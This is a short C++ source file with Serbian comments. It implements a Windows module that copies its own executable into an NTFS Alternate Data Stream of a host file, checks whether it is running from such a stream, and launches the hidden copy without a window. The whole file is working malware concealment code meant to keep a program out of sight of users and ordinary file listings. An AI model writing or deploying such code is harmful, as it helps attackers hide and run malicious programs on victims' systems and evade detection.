#include "ads_manager.h"
#include <windows.h>
#include <string>
#include <shlwapi.h> // Za PathFindFileNameA

#pragma comment(lib, "Shlwapi.lib")

namespace ADSManager {

    bool IsRunningFromADS() {
        char currentPath[MAX_PATH];
        GetModuleFileNameA(NULL, currentPath, MAX_PATH);
        // Putanje koje sadrže ":" posle imena drajvera (C:) ukazuju na ADS
        for (int i = 3; currentPath[i] != '\0'; ++i) {
            if (currentPath[i] == ':') {
                return true;
            }
        }
        return false;
    }

    bool HideSelfInADS(const char* hostFilePath, const char* streamName) {
        char currentPath[MAX_PATH];
        if (GetModuleFileNameA(NULL, currentPath, MAX_PATH) == 0) {
            return false;
        }

        std::string adsPath = std::string(hostFilePath) + std::string(streamName);

        // Kopiiraj trenutni .exe u ADS
        if (!CopyFileA(currentPath, adsPath.c_str(), FALSE)) {
            return false;
        }

        return true;
    }

    bool ExecuteFromADS(const char* hostFilePath, const char* streamName) {
        std::string adsPath = std::string(hostFilePath) + std::string(streamName);

        STARTUPINFOA si = { sizeof(si) };
        PROCESS_INFORMATION pi;
        
        // Pokretanje procesa direktno iz ADS putanje
        if (!CreateProcessA(NULL, (LPSTR)adsPath.c_str(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            return false;
        }

        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        
        return true;
    }
}